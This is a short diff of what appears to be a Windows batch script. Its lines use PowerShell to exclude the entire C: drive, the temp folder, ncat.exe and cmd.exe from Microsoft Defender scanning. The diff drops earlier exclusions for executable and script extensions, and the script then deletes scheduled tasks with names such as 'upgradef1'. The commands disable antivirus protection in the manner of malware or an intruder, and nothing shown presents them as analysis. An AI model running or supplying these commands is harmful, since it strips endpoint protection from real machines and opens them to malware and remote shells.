@@ -3,10 +3,7 @@ powershell -Command Add-MpPreference -ExclusionPath "C:\"
 powershell -Command Add-MpPreference -ExclusionPath "%temp%"
 powershell -Command Add-MpPreference -ExclusionProcess "ncat.exe"
 powershell -Command Add-MpPreference -ExclusionProcess "cmd.exe"
-powershell -Command Add-MpPreference -ExclusionExtension ".exe"
-powershell -Command Add-MpPreference -ExclusionExtension "exe"
-powershell -Command Add-MpPreference -ExclusionExtension ".vbs"
-powershell -Command Add-MpPreference -ExclusionExtension ".bat"
+
 schtasks /delete /tn "upgradef1" /f
 schtasks /delete /tn "InstallRequests" /f
 schtasks /delete /tn "RunPowerShellScript" /f
